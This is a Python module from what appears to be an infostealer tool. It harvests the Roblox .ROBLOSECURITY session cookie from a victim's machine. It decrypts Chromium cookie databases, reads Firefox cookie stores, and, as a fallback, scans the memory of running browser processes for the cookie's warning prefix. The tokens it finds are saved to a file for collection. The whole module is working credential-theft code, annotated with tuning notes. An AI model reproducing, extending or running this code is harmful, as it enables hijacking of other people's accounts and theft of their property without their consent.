"""The Roblox session cookie, from the cookie stores and from live memory.

``.ROBLOSECURITY`` is the whole account. There are two places it exists on a running
machine and they fail in different ways:

- **On disk.** Chromium keeps it in ``Network\\Cookies`` wrapped with DPAPI plus
  AES-256-GCM; Firefox keeps it in ``moz_cookies`` in the clear. A profile that has not
  been opened since the cookie was set still has it. A store being written to right now
  may refuse the copy.
- **In memory.** A browser that is running has already decrypted it and holds the
  plaintext for the life of the session. This also covers the case the database cannot:
  a store that will not copy, or a profile the current user cannot open.

So both are read, the database first because it is cheap and deterministic, then memory
for whatever is live. Every hit is deduplicated on the value, because the same cookie is
normally in both places.

Nothing here is trusted to be well-formed. A value has to look like a Roblox session
cookie before it is written: the modern ones carry a fixed warning prefix, and a legacy
one is a long run of base64-ish characters. A run that finds nothing writes no file and
says why in ``roblox_status.json``.
"""

from __future__ import annotations

import ctypes
import hashlib
import re
import time
from pathlib import Path
from typing import Any, Final

from .. import log, util, winapi
from . import browsers
from .browsers import chromium

COOKIE_NAME: Final[str] = ".ROBLOSECURITY"
STATUS_FILE: Final[str] = "roblox_status.json"
SESSION_FILE: Final[str] = "roblox_session.txt"

# The prefix every cookie minted since 2019 carries. It is the strongest signal in a
# memory image: 20 bytes that do not occur by accident.
_WARNING: Final[bytes] = b"_|WARNING:-DO-NOT-SHARE"
# A cookie body is long. Sixty is below every real one and above every random run of
# characters that survives the printable filter.
_MIN_BODY: Final[int] = 60
_MAX_TOKEN: Final[int] = 1400
_MAX_TOKENS: Final[int] = 8

_PRINTABLE: Final[re.Pattern[bytes]] = re.compile(
    rb"[A-Za-z0-9+/=_|.:\-]{%d,%d}" % (_MIN_BODY, _MAX_TOKEN)
)

# --- memory scan bounds -------------------------------------------------------
# A browser is a few hundred megabytes of committed pages and most of them are image or
# shared. The scan is capped three ways so a machine under load cannot turn a two-minute
# run into a ten-minute one: bytes per process, seconds of wall clock for the whole
# phase, and processes per image name.
_PROCESS_NAMES: Final[tuple[str, ...]] = ("chrome.exe", "msedge.exe", "brave.exe", "firefox.exe")
_MAX_PROCESSES: Final[int] = 24
_CHUNK: Final[int] = 4 * 1024 * 1024
_MAX_PER_PROCESS: Final[int] = 384 * 1024 * 1024
_SCAN_SECONDS: Final[float] = 30.0


def _harvest(block: bytes) -> list[bytes]:
    """Cookie-shaped strings in one block.

    One anchor only: the warning prefix. It is 20 bytes that do not occur by accident,
    and it is what every cookie minted since 2019 carries. Earlier attempts also matched
    "a long cookie-shaped run near the name", which returned the surrounding tab's text
    and other sites' cookies — an empty file is better than a misleading one.
    """
    found: list[bytes] = []

    for match in re.finditer(re.escape(_WARNING), block):
        tail = block[match.start() : match.start() + _MAX_TOKEN]
        run = _PRINTABLE.match(tail)
        if run and len(run.group()) >= _MIN_BODY:
            found.append(run.group())

    return found


def _scan_process(pid: int, deadline: float) -> tuple[list[bytes], int]:
    """Tokens found in one process, and how many bytes were read."""
    tokens: list[bytes] = []
    read_total = 0
    # The buffer is one chunk plus one token, because a cookie can straddle a chunk
    # boundary. Reading chunk-sized and starting each read at zero cuts a 900-byte value
    # in half roughly once per boundary and the scan reports a session that is not there.
    buffer = ctypes.create_string_buffer(_CHUNK + _MAX_TOKEN)

    with winapi.RemoteProcess(pid) as remote:
        if not remote:
            return [], 0

        for base, size in remote.regions():
            if time.monotonic() > deadline or read_total >= _MAX_PER_PROCESS:
                break
            if len(tokens) >= _MAX_TOKENS:
                break

            carry = 0
            offset = 0
            while offset < size:
                if time.monotonic() > deadline or read_total >= _MAX_PER_PROCESS:
                    break
                span = min(_CHUNK, size - offset)
                target = ctypes.addressof(buffer) + carry
                amount = remote.read_into(base + offset, ctypes.c_void_p(target), span)
                if amount <= 0:
                    # One unreadable page ends the region, not the process: the next
                    # VirtualQueryEx call picks up after it.
                    break
                read_total += amount
                window = buffer.raw[: carry + amount]
                for token in _harvest(window):
                    if token not in tokens:
                        tokens.append(token)
                keep = min(_MAX_TOKEN, carry + amount)
                ctypes.memmove(buffer, window[-keep:], keep)
                carry = keep
                if amount < span:
                    break
                offset += amount

    return tokens, read_total


def _memory_tokens() -> tuple[list[str], dict[str, Any]]:
    detail: dict[str, Any] = {"processes": 0, "scanned": 0, "found": 0, "reason": ""}

    wanted = {name.lower() for name in _PROCESS_NAMES}
    targets = [(pid, name) for pid, name in winapi.process_list() if name.lower() in wanted]
    if not targets:
        detail["reason"] = "no browser process running"
        return [], detail

    # A browser is forty processes and the token sits in one of them. Smallest private
    # commit first, because the cookie jar lives in the network service and the renderers
    # that carry a session are small — the multi-gigabyte renderer carrying the tab the
    # operator is looking at is the least likely of the forty and the most expensive to
    # read. The time budget, not the list, is what ends the scan.
    def weight(item: tuple[int, str]) -> tuple[bool, int]:
        size = winapi.process_private_bytes(item[0])
        return (size is None, size or 0)

    targets.sort(key=weight)
    detail["candidates"] = len(targets)

    tokens: list[str] = []
    deadline = time.monotonic() + _SCAN_SECONDS
    seen_pids: set[int] = set()
    counted = 0

    for pid, name in targets:
        if counted >= _MAX_PROCESSES or time.monotonic() > deadline:
            break
        if pid in seen_pids:
            continue
        seen_pids.add(pid)
        counted += 1
        found, read = _scan_process(pid, deadline)
        detail["scanned"] += read
        log.logger.debug("roblox: %s pid %d read %d bytes, %d hit(s)", name, pid, read, len(found))
        for raw in found:
            text = raw.decode("ascii", "replace")
            if text not in tokens:
                tokens.append(text)

    detail["processes"] = counted
    detail["found"] = len(tokens)
    if not tokens:
        detail["reason"] = f"{counted} process(es) scanned, no cookie"
    return tokens, detail


# --- cookie stores ------------------------------------------------------------


def _chromium_tokens() -> tuple[list[str], dict[str, Any]]:
    detail: dict[str, Any] = {"profiles": 0, "found": 0, "reason": ""}
    tokens: list[str] = []

    for root in browsers.chromium_roots():
        try:
            if not root.path.is_dir():
                continue
        except OSError:
            continue

        profiles = [root.path] if root.profile_is_root else browsers.profile_dirs(root.path)
        for profile in profiles:
            detail["profiles"] += 1
            try:
                keys = chromium.profile_keys(profile)
            except Exception:
                log.logger.debug("roblox: no keys for %s", profile, exc_info=True)
                continue

            source = next(
                (
                    candidate
                    for candidate in (profile / "Network" / "Cookies", profile / "Cookies")
                    if candidate.is_file()
                ),
                None,
            )
            if source is None:
                continue

            with util.temp_workspace("sable-roblox-") as scratch:
                copy = chromium.copy_database(source, scratch)
                if copy is None:
                    detail["reason"] = "copy refused"
                    continue
                rows = chromium.read_table(
                    copy,
                    "cookies",
                    ("host_key", "name", "value", "encrypted_value"),
                    _MAX_TOKENS * 8,
                    "last_access_utc DESC",
                )

            for row in rows:
                if chromium.text_value(row["name"]).lower() != COOKIE_NAME.lower():
                    continue
                host = chromium.text_value(row["host_key"])
                binding = hashlib.sha256(host.encode("utf-8")).digest()
                secret = chromium.secret_value(row["encrypted_value"], keys, binding)
                value = (
                    secret.decode("utf-8", "replace")
                    if secret is not None
                    else chromium.text_value(row["value"])
                )
                value = value.strip()
                if len(value) >= _MIN_BODY and value not in tokens:
                    tokens.append(value)

    detail["found"] = len(tokens)
    if not tokens and not detail["reason"]:
        detail["reason"] = "no .ROBLOSECURITY row"
    return tokens, detail


def _gecko_tokens() -> tuple[list[str], dict[str, Any]]:
    detail: dict[str, Any] = {"profiles": 0, "found": 0, "reason": ""}
    tokens: list[str] = []

    for root in browsers.gecko_roots():
        try:
            if not root.path.is_dir():
                continue
        except OSError:
            continue
        for profile in browsers.firefox_profiles(root.path):
            detail["profiles"] += 1
            with util.temp_workspace("sable-roblox-") as scratch:
                copy = chromium.copy_database(profile / "cookies.sqlite", scratch)
                if copy is None:
                    detail["reason"] = "copy refused"
                    continue
                rows = chromium.read_table(
                    copy,
                    "moz_cookies",
                    ("host", "name", "value"),
                    _MAX_TOKENS * 8,
                    "lastAccessed DESC",
                )
            for row in rows:
                if chromium.text_value(row["name"]).lower() != COOKIE_NAME.lower():
                    continue
                value = chromium.text_value(row["value"]).strip()
                if len(value) >= _MIN_BODY and value not in tokens:
                    tokens.append(value)

    detail["found"] = len(tokens)
    if not tokens and not detail["reason"]:
        detail["reason"] = "no .ROBLOSECURITY row"
    return tokens, detail


def run(out_dir: Path, cfg: Any) -> int:
    """Collect the Roblox session cookie from every store and from memory.

    Returns the number of distinct tokens written. A machine with no Roblox session
    writes ``roblox_status.json`` saying which of the two methods found nothing and why,
    so a zero here is never ambiguous.
    """
    del cfg  # the collector has no options; the browsers flag is what enables it

    chromium_tokens, chromium_detail = _chromium_tokens()
    gecko_tokens, gecko_detail = _gecko_tokens()

    collected: list[str] = []
    for value in (*chromium_tokens, *gecko_tokens):
        if value not in collected:
            collected.append(value)

    # Memory only earns its cost when the stores are empty: a cookie already read off
    # disk is the same string, and the scan is the slow half of this module.
    memory_tokens: list[str] = []
    memory_detail: dict[str, Any] = {"processes": 0, "scanned": 0, "found": 0, "reason": "skipped, store answered"}
    if not collected:
        memory_tokens, memory_detail = _memory_tokens()
        for value in memory_tokens:
            if value not in collected:
                collected.append(value)

    status = {
        "cookie": COOKIE_NAME,
        "found": len(collected),
        "methods": {
            "chromium": chromium_detail,
            "gecko": gecko_detail,
            "memory": memory_detail,
        },
        "reason": "" if collected else "no session cookie on this machine",
    }

    if not collected:
        util.write_json(out_dir / STATUS_FILE, status)
        log.logger.debug("roblox: nothing found")
        return 0

    if not util.write_text(out_dir / SESSION_FILE, "\n".join(collected) + "\n"):
        status["reason"] = "write refused"
        util.write_json(out_dir / STATUS_FILE, status)
        return 0

    status["reason"] = ""
    util.write_json(out_dir / STATUS_FILE, status)
    log.logger.debug("roblox: %d token(s)", len(collected))
    return len(collected)


__all__ = ["COOKIE_NAME", "SESSION_FILE", "STATUS_FILE", "run"]
